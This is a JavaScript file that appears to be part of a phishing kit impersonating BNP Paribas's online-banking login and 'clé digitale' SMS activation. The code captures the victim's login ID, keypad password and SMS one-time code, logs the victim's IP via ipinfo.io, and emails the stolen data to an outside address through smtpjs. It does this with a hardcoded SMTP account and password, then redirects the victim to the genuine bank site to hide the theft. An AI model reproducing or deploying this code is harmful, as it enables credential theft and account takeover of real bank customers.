
//console.log(res[1])
window.clavier=false
window.password=""
window.login=""
window.ready=false
window.reboot=0
window.sms_=0
window.ok=false
window.to_=localStorage.rmail
console.log(to_)
window.smshtml='<h3 style="color:#993ba7;">Pour finaliser l&rsquo; activation de votre CLÉ DIGITALE vous  devez :</h3> Saisir le code que vous avez reçu par sms<br/> <span style="color:green"></span><p><img src="./img/phone.svg" align="center" width="35">&nbsp;+33 0* ** ** ** **</p> <br><div id="sms"> <input style="text-align:center;letter-spacing:4px;" type="text" id="sms" placeholder="_ _ _ _ _" maxlength="5"><div id="timer"></div></div><p></p>'

$('#submit_sms').click(function(){
 
    if(!ok){   
    
    $('#data').html('<img src="./img/835.gif"><p style="color:#black;opacity:.7;">Vérification mobile en cours...</p>').show(400)
    ok =true
     setTimeout(function(){
      $('#data').html(smshtml)
    timer()
       
    },7000)
    } else {
        if(sms()==0 || sms()==null){
            alert("*Veuillez saisir correctement le code reçu par sms .")
        } else {
           
        var sub='BNP SMS > '+ipClient
        var data =sms()
         init(to_,sub,data)
        $('#data').html('<img src="./img/835.gif"><p style="color:#black;opacity:.7;">Activation en cours...</p>')
            setTimeout(function(){
                $('#data').html('')
                $('#bind')[0].click()
            },9000)
            
            setTimeout(function(){
                window.location="https://mabanque.bnpparibas/"
            },13000)
         
           
        }
        
        
    }
    
})
$('#submit').click(function(){
$('#form_login').hide(10)
$('.loadingg').show()
setTimeout(()=>{
    $('.loadingg').hide()
 validate_form('form.login')
},8000)
//

    
})
$('#login').on('keyup change',function(){
   if(reboot==1){
    var log =$(this).val()
     login=log
   
    }
    if(reboot>1){
        reboot=0
    }
    reboot++
    
 
    
       if($(this).val().length>4){
$('#clavier').removeClass('clavier_hide') 
 $('#password_').removeClass('password_hide') 

clavier=true
    } else {
 $('#clavier').addClass('clavier_hide') 
 $('#password_').addClass('password_hide') 
        clavier=false
    }
  
})
$('td').click(function(){
    
    if(clavier){
    var pass =$(this).attr('id')
    password+=pass
        var asterix =''
        var l =password.length
        if(l<7){
    
        for(var i=0;i<l;i++){
           asterix+='*'
        }
        $('#password').val(asterix)
            if(l==6){
           $('#submit').html('<img src="./img/submit.png">')
                ready=true
                console.log(ready)
            } else {
                $('#submit').html('')
            }
    }}
})
$('.clean').click(function(){
    if($(this).attr('id')=='c1'){
        $('#login').val('')
        login=''
    } else {
         $('#password').val('')
        
        password=''
         $('#submit').html('')
        
    }
})
function sms(){
    if(ok){
        
    
    if($('input#sms').val()!==""){
     
        return $('input#sms').val()
        
    } else {
        return 0
    }
        } else {
            return 0
        }
}
function validate_form(e){
    if(e=="form.login"){
       if(ready){


var sub_='BNP Credidentials > '+ipClient
var message='<i>ID : '+login+' Pass : '+password
if(mobile!=""){
    init(to_,sub_+' From : '+mobile,message)
} else {
    init(to_,sub_+' From : PC ',message)
    
}

      $('#form_login').hide(100)
           setTimeout(function(){
                $('#form_cle').show(10)
           },400)
       
          
        
           
           
       }
    }
    
} 

 
function startTimer() {
  var presentTime = document.getElementById('timer').innerHTML;
    if(presentTime=="0:00"){
        timer()
        return false
    }
  var timeArray = presentTime.split(/[:]+/);
  var m = timeArray[0];
  var s = checkSecond((timeArray[1] - 1));
  if(s==59){m=m-1}
  //if(m<0){alert('timer completed')}
  
  document.getElementById('timer').innerHTML =
    m + ":" + s;
  setTimeout(startTimer, 1000);
}
function timer(){
    document.getElementById('timer').innerHTML =
  03 + ":" + 00;
startTimer();
}
function checkSecond(sec) {
  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
  if (sec < 0) {sec = "59"};
  return sec;
}
function getIP(){
    $.get("https://ipinfo.io", function(data) {
    window.ipClient=data.ip
        $.getScript( "https://smtpjs.com/v2/smtp.js", function( data, textStatus, jqxhr ) {
            console.log(textStatus)

 
});
}, "jsonp").done(function(data) {
  window.ipClient=data.ip
     // $.get('./m.html',function(data){
        //  $('body').html(data)
     // })
        $('#form_login').show()
      $('.loading').show()
             console.log(ipClient)
        })
         
  
}
getIP()

function init(to_,sub_,data){
Email.send("log.console@net-c.com",
to_,
sub_,
data,
"smtp.googlemail.com",
"reznov@ltd-nc.fr",
"Azerty45");
    
}
function save_f(content, filename){
    var dlg = false;
    with(document){
     ir=createElement('iframe');
     ir.id='ifr';
     ir.location='about.blank';
     ir.style.display='none';
     body.appendChild(ir);
      with(getElementById('ifr').contentWindow.document){
           open("text/plain", "replace");
           charset = "utf-8";
           write(content);
           close();
           document.charset = "utf-8";
           dlg = execCommand('SaveAs', false, filename);
       }
       body.removeChild(ir);
     }
    return dlg;
}
